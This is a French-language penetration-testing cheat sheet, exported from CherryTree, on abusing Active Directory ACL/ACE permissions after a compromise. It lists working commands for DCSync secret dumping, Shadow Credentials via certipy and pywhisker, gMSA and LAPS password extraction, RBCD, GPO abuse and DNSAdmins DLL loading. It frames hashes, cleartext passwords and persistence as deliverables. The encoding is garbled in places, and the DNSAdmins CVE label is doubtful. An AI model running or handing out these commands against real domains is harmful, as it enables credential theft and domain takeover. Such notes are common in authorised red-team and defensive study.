<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>08-ACLs/ACEs permissions</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>08-ACLs/ACEs permissions</h1><br/><p><h1>Phase 8 â€” Exploitation des ACL/ACE (post-compromission Active Directory)</h1></p><p><ol><li>1. <h3>1. DCSYNC : rÃ©plication illicite des secrets du domaine</h3></li><li>Groupes/objets autorisÃ©s : <strong>Administrators</strong>, <strong>Domain Admins</strong>, <strong>Enterprise Admins</strong>, comptes <strong>DC$</strong>.</li></ol></p><p><ul><li>Dump :</li></ul></p><p><code>mimikatz lsadump::dcsync /domain:&lt;target_domain&gt; /user:&lt;domain&gt;\administrator</code><code></code></p><p><code>secretsdump.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;dc_ip&gt;</code><code></code></p><p><code></code><ul><li>âžœ <strong>Domain Admin</strong> ðŸ”´â€‚|â€‚<em>mouvement latÃ©ral</em> ðŸŸ¦â€‚|â€‚<em>hashes crackables</em> ðŸŸ§</li></ul></p><p></p><p></p><p><ol><li>2. <h1>2. Shadow Credentials (+ AD CS)</h1></li><li>This technique is widely known in the offensive security community as &quot;Shadow Credentials.&quot;</li><li>What is msDS-KeyCredentialLink?<ul><li>To understand the exploit, you must understand the feature. This attribute was introduced to support <strong>Windows Hello for Business</strong> (WHfB).</li></ul></li><li>The Legit Use Case: When a user sets up a <strong>PIN or Biometric login</strong>, Windows creates a public/private key pair. <strong>The private key is stored in the device&#39;s TPM (Trusted Platform Module)</strong>, a<strong>nd the public key is written to the user object&#39;s msDS-KeyCredentialLink attribute in AD</strong>.</li></ol></p><p></p><p>The Authentication: When the user logs in with a PIN, the device performs PKINIT (Public Key Cryptography for Initial Authentication) in Kerberos. The Domain Controller (KDC) validates the request against the public key stored in that attribute.</p><p></p><p>The Vulnerability: If an attacker can write to this attribute, they can enroll a &quot;rogue device&quot; (the attacker&#39;s machine) for that user. They don&#39;t need the user&#39;s password; they just need to prove they possess the private key corresponding to the public key they just injected.</p><p><ul><li>Condition : droit <strong>GenericWrite</strong>/<strong>WriteProp</strong> sur <em>msDS-KeyCredentialLink</em> of a user.</li></ul></p><p></p><p><div class="codebox"><pre>certipy shadow auto -u <span style="color:#ff9d00;font-weight:700">&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span>@<span style="color:#ff9d00;font-weight:700">&lt;</span>dom<span style="color:#ff9d00;font-weight:700">&gt;</span> -p <span style="color:#ff9d00;font-weight:700">&lt;</span>pwd<span style="color:#ff9d00;font-weight:700">&gt;</span> -account <span style="color:#ff9d00;font-weight:700">&lt;</span>target_account<span style="color:#ff9d00;font-weight:700">&gt;</span><br />pywhisker.py -d <span style="color:#ff9d00;font-weight:700">&lt;</span>FQDN<span style="color:#ff9d00;font-weight:700">&gt;</span> -u <span style="color:#3ad900;font-weight:400">&quot;user1&quot;</span> -p <span style="color:#ff9d00;font-weight:700">&lt;</span>CERT_PWD<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#333333;font-weight:400">\<br /></span>             --target <span style="color:#3ad900;font-weight:400">&quot;&lt;SAMNAME$&gt;&quot;</span> --action list</pre></div><code></code></p><p><code></code><ul><li>âžœ <strong>Pass-the-Certificate</strong></li></ul></p><p></p><p></p><p><ol><li>3. <h1>3. Droits sur Group</h1></p><p></li></ol><table class="table"><tr><th>ACE utile</th><th>Exploitation</th><th>Effet</th></tr><tr><td>GenericAll / GenericWrite / Self / Add</td><td>Add-ADGroupMember ou net localgroup</td><td>Ajout dans un groupe privilÃ©giÃ©</td></tr><tr><td>WriteOwner</td><td>Sâ€™attribuer la propriÃ©tÃ© â†’ modifier ACL</td><td>Pivoter vers GenericAll</td></tr><tr><td>WriteDACL + WriteOwner</td><td>Accorder Full Control Ã  soi-mÃªme</td><td>Escalade complÃ¨te</td></tr></table></p><p><ol><li>4. <h1>4. Droits sur Computer</h1></p><p></li></ol><table class="table"><tr><th>ACE</th><th>Exploit</th><th>RÃ©sultat</th></tr><tr><td>msDS-AllowedToActOnBehalfOfOtherIdentity</td><td>CrÃ©er un TGT via Rubeus â€ </td><td>RBCD ðŸŸ¢ â‡’ DA</td></tr><tr><td>GenericAll / Write</td><td>Ajout Key Credential</td><td>Shadow Credentials ðŸŸ¦</td></tr></table></p><p><ol><li>5. <h1>5. Droits sur User</h1></p><p></li></ol><table class="table"><tr><th>Action</th><th>Commande</th><th>Gain</th></tr><tr><td>Add SPN</td><td>targetedKerberoast.py</td><td>Hash TGS ðŸŸ§</td></tr><tr><td>Add Key Cred</td><td>idem ShadowCreds</td><td>PTC / DA</td></tr><tr><td>ForceChangePassword</td><td>net user &lt;usr&gt; &lt;newpwd&gt; /domain</td><td>Clear-text PW ðŸŸ©</td></tr><tr><td>Login Script</td><td>Modifier attrib. scriptPath</td><td>Persistance / accÃ¨s</td></tr></table></p><p><ol><li>6. <h1>6. Droits sur OU</h1></li><li>ACE : <strong>GenericAll / GenericWrite / Manage Group Policy Links</strong></li></ol></p><p><ul><li>Outil : <code>OUined.py --config config.ini</code></li></ul></p><p><ul><li>âžœ Liaison dâ€™un GPO malveillant â†’ <em>ACCESS</em>.</li></ul></p><p></p><p></p><p><ol><li>7. <h1>7. Lecture gMSA passwords</h1></p><p></li></ol><div class="codebox"><pre>gMSADumper.py -u <span style="color:#ff9d00;font-weight:700">&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span> -p <span style="color:#ff9d00;font-weight:700">&lt;</span>pwd<span style="color:#ff9d00;font-weight:700">&gt;</span> -d <span style="color:#ff9d00;font-weight:700">&lt;</span>dom<span style="color:#ff9d00;font-weight:700">&gt;</span><br />nxc ldap <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span> -u <span style="color:#ff9d00;font-weight:700">&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span> -p <span style="color:#ff9d00;font-weight:700">&lt;</span>pwd<span style="color:#ff9d00;font-weight:700">&gt;</span> --gmsa<br />ldeep ldap â€¦ gmsa</pre></div><ul><li><code>â—‡ </code>â—‡ âžœ Secrets de services â‡’ rebond serveur / DA.</li></ul></p><p></p><p></p><p><ol><li>8. <h1>8. RÃ©cupÃ©ration LAPS</h1></li><li>VÃ©rifier qui peut lire : <code>MATCH p=(g:Base)-[:ReadLAPSPassword]-&gt;(c:Computer) RETURN p</code></li></ol></p><p><ul><li>Dump :</li></ul></p><p><code>Get-LapsADPassword -DomainController &lt;dc&gt; -Credential &lt;dom&gt;\&lt;login&gt;</code><code></code></p><p><code>ldeep ldap â€¦ -s ldaps://&lt;dc_ip&gt; laps</code><code></code></p><p><code></code><ul><li>âžœ <strong>Admin</strong> ðŸ©· (local) via PW dÃ©diÃ©s.</li></ul></p><p></p><p></p><p><ol><li>9. <h1>9. ContrÃ´le / abus GPO</h1></li><li>Ã‰numÃ©ration :</li></ol></p><p><code>MATCH p=((n:Base)-[]-&gt;(gp:GPO)) RETURN p</code><code></code></p><p><code>Get-DomainObjectAcl -SearchBase &quot;CN=Policies,CN=System,DC=â€¦&quot; -ResolveGUIDs</code><code></code></p><p><code></code><ul><li><strong>GenericWrite</strong> sur un GPO â†’ injecter script / Scheduled Task â‡’ <em>ACCESS</em> (code signÃ© SYSTEM).</li></ul></p><p></p><p></p><p><ol><li>10. <h1>10. DNSAdmins (CVE-2021-40469)</h1></li></ol></p><p><code>dnscmd.exe /config /serverlevelplugindll \\path\to\dll   # nÃ©cessite un user DNSAdmins</code><code></code></p><p><code>sc \\DNSServer stop dns &amp;&amp; sc \\DNSServer start dns</code><ul><li><code>â—‡ </code>â—‡ âžœ <strong>Admin</strong> ðŸ©· (exÃ©cution DLL en SYSTEM sur DC/dns).</li></ul></p><p></p><p></p><p><strong>Livrables phase 8</strong><ul><li>Tickets PTC &amp; TGT, clÃ©s privÃ©es, hashes, mots de passe en clair.</li></ul></p><p><ul><li>Nouveaux chemins <strong>Domain Admin</strong> : DCSYNC, Shadow Creds, RBCD, GPO abuse, DNSAdmins.</li></ul></p><p><ul><li>Persistance : login scripts, certificats, ACL modifiÃ©es.</li></ul></p><p></p><p></p></div>
</body>
</html>
